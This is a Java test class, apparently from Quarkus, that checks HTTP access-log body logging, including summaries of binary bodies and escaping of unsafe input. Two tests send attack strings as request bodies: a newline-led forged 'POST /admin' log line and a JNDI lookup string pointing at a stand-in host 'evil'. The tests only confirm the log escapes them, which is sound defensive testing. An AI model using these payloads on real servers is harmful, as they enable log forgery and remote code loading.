package io.quarkus.vertx.http.accesslog;

import static org.assertj.core.api.Assertions.assertThat;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Properties;
import java.util.concurrent.TimeUnit;
import java.util.function.Supplier;

import jakarta.enterprise.context.ApplicationScoped;
import jakarta.enterprise.event.Observes;

import org.awaitility.Awaitility;
import org.jboss.shrinkwrap.api.ShrinkWrap;
import org.jboss.shrinkwrap.api.asset.ByteArrayAsset;
import org.jboss.shrinkwrap.api.spec.JavaArchive;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.RegisterExtension;

import io.quarkus.test.QuarkusExtensionTest;
import io.restassured.RestAssured;
import io.vertx.core.buffer.Buffer;
import io.vertx.ext.web.Router;

public class AccessLogBodyTestCase {

    @RegisterExtension
    public static QuarkusExtensionTest unitTest = new QuarkusExtensionTest()
            .setArchiveProducer(new Supplier<>() {
                @Override
                public JavaArchive get() {
                    try {
                        Path logDirectory = Files.createTempDirectory("quarkus-access-log-body-tests");
                        Properties p = new Properties();
                        p.setProperty("quarkus.http.access-log.enabled", "true");
                        p.setProperty("quarkus.http.access-log.log-to-file", "true");
                        p.setProperty("quarkus.http.access-log.base-file-name", "server");
                        p.setProperty("quarkus.http.access-log.log-directory", logDirectory.toAbsolutePath().toString());
                        p.setProperty("quarkus.http.access-log.pattern",
                                "%r %s request=%{REQUEST_BODY} response=%{RESPONSE_BODY}");
                        p.setProperty("quarkus.http.access-log.log-request-body", "true");
                        p.setProperty("quarkus.http.access-log.log-response-body", "true");
                        ByteArrayOutputStream out = new ByteArrayOutputStream();
                        p.store(out, null);

                        return ShrinkWrap.create(JavaArchive.class)
                                .add(new ByteArrayAsset(out.toByteArray()), "application.properties")
                                .addClasses(EchoRoute.class);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                }
            });

    @org.eclipse.microprofile.config.inject.ConfigProperty(name = "quarkus.http.access-log.log-directory")
    Path logDirectory;

    @Test
    public void testRequestAndResponseBodiesAreLogged() throws IOException {
        RestAssured.given()
                .body("hello-request")
                .contentType("text/plain")
                .post("/echo")
                .then()
                .statusCode(200);

        Awaitility.await().pollInterval(100, TimeUnit.MILLISECONDS)
                .atMost(10, TimeUnit.SECONDS)
                .untilAsserted(() -> {
                    String data = Files.readString(logDirectory.resolve("server.log"));
                    assertThat(data).contains("request=hello-request");
                    assertThat(data).contains("response=echo:hello-request");
                });
    }

    @Test
    public void testBinaryBodiesAreSummarized() throws IOException {
        RestAssured.given()
                .body(new byte[] { 0x00, 0x01, 0x02, 0x03 })
                .contentType("application/octet-stream")
                .post("/binary")
                .then()
                .statusCode(200);

        Awaitility.await().pollInterval(100, TimeUnit.MILLISECONDS)
                .atMost(10, TimeUnit.SECONDS)
                .untilAsserted(() -> {
                    String data = Files.readString(logDirectory.resolve("server.log"));
                    assertThat(data).contains("request=<binary, 4 bytes>");
                    assertThat(data).contains("response=<binary, 4 bytes>");
                });
    }

    @Test
    public void testNonBufferResponsesAreSummarized() throws IOException {
        RestAssured.get("/file")
                .then()
                .statusCode(200);

        Awaitility.await().pollInterval(100, TimeUnit.MILLISECONDS)
                .atMost(10, TimeUnit.SECONDS)
                .untilAsserted(() -> {
                    String data = Files.readString(logDirectory.resolve("server.log"));
                    assertThat(data).contains("response=<non-buffer body>");
                });
    }

    @Test
    public void testRequestBodyNewlinesAreEscaped() throws IOException {
        RestAssured.given()
                .body("\nPOST /admin 200 request=logged response=success")
                .contentType("text/plain")
                .post("/echo")
                .then()
                .statusCode(200);

        Awaitility.await().pollInterval(100, TimeUnit.MILLISECONDS)
                .atMost(10, TimeUnit.SECONDS)
                .untilAsserted(() -> {
                    String data = Files.readString(logDirectory.resolve("server.log"));
                    assertThat(data).contains("request=\\nPOST /admin 200 request=logged response=success");
                    assertThat(data).doesNotContain("\nPOST /admin 200 request=logged response=success");
                });
    }

    @Test
    public void testRequestBodyLookupSequencesAreEscaped() throws IOException {
        RestAssured.given()
                .body("${jndi:ldap://evil}")
                .contentType("text/plain")
                .post("/echo")
                .then()
                .statusCode(200);

        Awaitility.await().pollInterval(100, TimeUnit.MILLISECONDS)
                .atMost(10, TimeUnit.SECONDS)
                .untilAsserted(() -> {
                    String data = Files.readString(logDirectory.resolve("server.log"));
                    assertThat(data).contains("request=$\\{jndi:ldap://evil}");
                    assertThat(data).doesNotContain("request=${jndi:ldap://evil}");
                });
    }

    @ApplicationScoped
    public static class EchoRoute {
        public void register(@Observes Router router) {
            router.post("/echo").handler(rc -> rc.response().end("echo:" + rc.body().asString()));
            router.post("/binary").handler(rc -> rc.response().end(Buffer.buffer(rc.body().buffer().getBytes())));
            router.get("/file").handler(rc -> {
                try {
                    Path file = Files.createTempFile("access-log-body", ".bin");
                    Files.write(file, new byte[] { 0x01, 0x02, 0x03 });
                    rc.response().sendFile(file.toString());
                } catch (IOException e) {
                    rc.fail(e);
                }
            });
        }
    }
}
